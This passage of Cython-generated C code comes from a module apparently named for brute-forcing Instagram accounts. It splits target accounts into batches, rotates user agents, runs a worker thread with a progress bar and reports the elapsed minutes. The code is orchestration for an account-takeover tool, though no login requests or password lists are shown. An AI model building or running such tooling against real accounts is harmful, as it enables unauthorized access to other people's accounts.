    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 69, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __pyx_v_chunk = ((PyObject*)__pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_v_target = __pyx_t_6;
    __pyx_t_6 = 0;

     
    while (1) {
      __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_v_target); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 70, __pyx_L1_error)
      if (!__pyx_t_4) break;

       
      __pyx_t_6 = __Pyx_PyObject_GetSlice(__pyx_v_target, 0, 5, NULL, NULL, &__pyx_slice__8, 1, 1, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 71, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_XDECREF_SET(__pyx_v_account, __pyx_t_6);
      __pyx_t_6 = 0;

       
      __pyx_t_10 = __Pyx_PyList_Append(__pyx_v_chunk, __pyx_v_account); if (unlikely(__pyx_t_10 == ((int)-1))) __PYX_ERR(0, 72, __pyx_L1_error)

       
      if (__Pyx_PyObject_DelSlice(__pyx_v_target, 0, 5, NULL, NULL, &__pyx_slice__8, 1, 1, 1) < 0) __PYX_ERR(0, 73, __pyx_L1_error)
    }

     
      {
      __Pyx_INCREF(__pyx_v_chunk);
      __pyx_v_data = __pyx_v_chunk;
    }

     
    goto __pyx_L6;
  }

   
    {
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 77, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_v_data = __pyx_t_6;
    __pyx_t_6 = 0;
  }
  __pyx_L6:;

   
  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_1loading, 0, __pyx_n_s_Base_start_locals_loading, ((PyObject*)__pyx_cur_scope), __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__10)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_loading = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_3normal, 0, __pyx_n_s_Base_start_locals_normal, ((PyObject*)__pyx_cur_scope), __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__12)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_normal = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_5randoms, 0, __pyx_n_s_Base_start_locals_randoms, ((PyObject*)__pyx_cur_scope), __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__14)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_randoms = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 112, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 112, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_11);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_11, function);
    }
  }
  __pyx_t_6 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 112, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_v_start_time = __pyx_t_6;
  __pyx_t_6 = 0;

   
    {
    __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_v_progress, __pyx_n_s_exit); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 114, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __pyx_t_11 = __Pyx_PyObject_LookupSpecial(__pyx_v_progress, __pyx_n_s_enter); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 114, __pyx_L9_error)
    __Pyx_GOTREF(__pyx_t_11);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_11);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_11, function);
      }
    }
    __pyx_t_6 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 114, __pyx_L9_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __pyx_t_11 = __pyx_t_6;
    __pyx_t_6 = 0;
      {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
          {
          __pyx_v_status = __pyx_t_11;
          __pyx_t_11 = 0;

           
          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_status, __pyx_n_s_add_task); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_7 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_total, __pyx_t_2) < 0) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_tuple__15, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 115, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_v_task = __pyx_t_2;
          __pyx_t_2 = 0;

           
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_sleep); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 116, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_2 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_int_2);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 116, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

           
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_threading); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_Thread); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_v_random_user_agent); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 117, __pyx_L13_error)
          if (__pyx_t_4) {
            __Pyx_INCREF(__pyx_v_randoms);
            __pyx_t_11 = __pyx_v_randoms;
          } else {
            __Pyx_INCREF(__pyx_v_normal);
            __pyx_t_11 = __pyx_v_normal;
          }
          if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_target, __pyx_t_11) < 0) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_v_data)) { __Pyx_RaiseUnboundLocalError("data"); __PYX_ERR(0, 117, __pyx_L13_error) }
          __pyx_t_11 = PyTuple_New(4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_INCREF(__pyx_v_data);
          __Pyx_GIVEREF(__pyx_v_data);
          PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_data);
          __Pyx_INCREF(__pyx_v_kwargs);
          __Pyx_GIVEREF(__pyx_v_kwargs);
          PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_kwargs);
          __Pyx_INCREF(__pyx_v_task);
          __Pyx_GIVEREF(__pyx_v_task);
          PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_v_task);
          __Pyx_INCREF(__pyx_v_status);
          __Pyx_GIVEREF(__pyx_v_status);
          PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_v_status);
          if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_args, __pyx_t_11) < 0) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 117, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_v_thread = __pyx_t_11;
          __pyx_t_11 = 0;

           
          __pyx_t_11 = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_loading(__pyx_v_loading, __pyx_v_thread, __pyx_v_task, __pyx_v_status); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 118, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

           
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_thread, __pyx_n_s_join); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 119, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_2, function);
            }
          }
          __pyx_t_11 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 119, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

           
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L18_try_end;
        __pyx_L13_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          {
          __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_2, &__pyx_t_6) < 0) __PYX_ERR(0, 114, __pyx_L15_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_3 = PyTuple_Pack(3, __pyx_t_11, __pyx_t_2, __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 114, __pyx_L15_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_3, NULL);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 114, __pyx_L15_except_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          if (__pyx_t_4 < 0) __PYX_ERR(0, 114, __pyx_L15_except_error)
          __pyx_t_18 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_18) {
            __Pyx_GIVEREF(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_XGIVEREF(__pyx_t_6);
            __Pyx_ErrRestoreWithState(__pyx_t_11, __pyx_t_2, __pyx_t_6);
            __pyx_t_11 = 0; __pyx_t_2 = 0; __pyx_t_6 = 0; 
            __PYX_ERR(0, 114, __pyx_L15_except_error)
          }
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          goto __pyx_L14_exception_handled;
        }
        __pyx_L15_except_error:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        goto __pyx_L1_error;
        __pyx_L14_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        __pyx_L18_try_end:;
      }
    }
      {
       {
        if (__pyx_t_13) {
          __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__3, NULL);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 114, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        }
        goto __pyx_L12;
      }
      __pyx_L12:;
    }
    goto __pyx_L22;
    __pyx_L9_error:;
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
    goto __pyx_L1_error;
    __pyx_L22:;
  }

   
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 121, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 121, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_11);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_11, function);
    }
  }
  __pyx_t_6 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 121, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_v_end_time = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_utils); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 122, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get_duration); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 122, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_11 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_11)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_11);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_11, __pyx_v_start_time, __pyx_v_end_time, __pyx_n_u_minutes};
    __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_GOTREF(__pyx_t_6);
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_11, __pyx_v_start_time, __pyx_v_end_time, __pyx_n_u_minutes};
    __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_GOTREF(__pyx_t_6);
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_11) {
      __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_11); __pyx_t_11 = NULL;
    }
    __Pyx_INCREF(__pyx_v_start_time);
    __Pyx_GIVEREF(__pyx_v_start_time);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_12, __pyx_v_start_time);
    __Pyx_INCREF(__pyx_v_end_time);
    __Pyx_GIVEREF(__pyx_v_end_time);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_12, __pyx_v_end_time);
    __Pyx_INCREF(__pyx_n_u_minutes);
    __Pyx_GIVEREF(__pyx_n_u_minutes);
    PyTuple_SET_ITEM(__pyx_t_3, 2+__pyx_t_12, __pyx_n_u_minutes);
    __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_minutes = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 123, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 123, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_minutes); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_9);
  PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_9);
  __Pyx_INCREF(__pyx_n_u_theme);
  __Pyx_GIVEREF(__pyx_n_u_theme);
  PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_u_theme);
  __pyx_t_9 = 0;
  __pyx_t_9 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_justify, __pyx_n_u_center) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_5, __pyx_t_9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = PyTuple_New(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_title, __pyx_kp_u_Proses_selesai_dalam) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_subtitle, __pyx_n_u_Menit) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_9, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_6 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_5);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_ig_back); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 125, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
